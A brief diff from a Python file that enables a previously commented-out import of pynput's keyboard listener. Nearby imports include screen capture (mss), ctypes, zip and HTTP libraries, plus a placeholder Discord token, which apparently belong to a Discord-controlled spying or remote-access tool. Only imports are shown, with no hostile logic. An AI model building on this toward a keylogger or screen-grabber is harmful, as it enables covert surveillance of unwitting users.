@@ -31,7 +31,7 @@ from ctypes import *
 from mss import mss
 from zipfile import ZipFile
 from requests import get
-#from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener
 
 TOKEN = 'DISCORD_TOKEN'
 
